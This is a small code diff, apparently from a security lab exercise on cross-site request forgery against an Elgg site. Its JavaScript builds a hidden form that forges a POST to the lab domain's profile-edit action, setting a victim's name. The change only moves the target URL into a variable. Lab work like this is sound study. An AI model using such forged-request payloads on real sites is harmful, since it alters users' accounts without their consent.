@@ -10,6 +10,7 @@
       // 创建表单元素
       var req = document.createElement("form");
 
+      var url = "http://www.csrflabelgg.com/action/profile/edit";
       var content;
       content += "<input type='hidden' name='name' value='Alice'>";
       // 个人主页描述
@@ -39,7 +40,7 @@
 
 
       // 修改表单元素信息
-      req.action = "http://www.csrflabelgg.com/action/profile/edit";
+      req.action = url;
       req.innerHTML = content;
       req.target = "_self";
       req.method = "post";  // POST请求
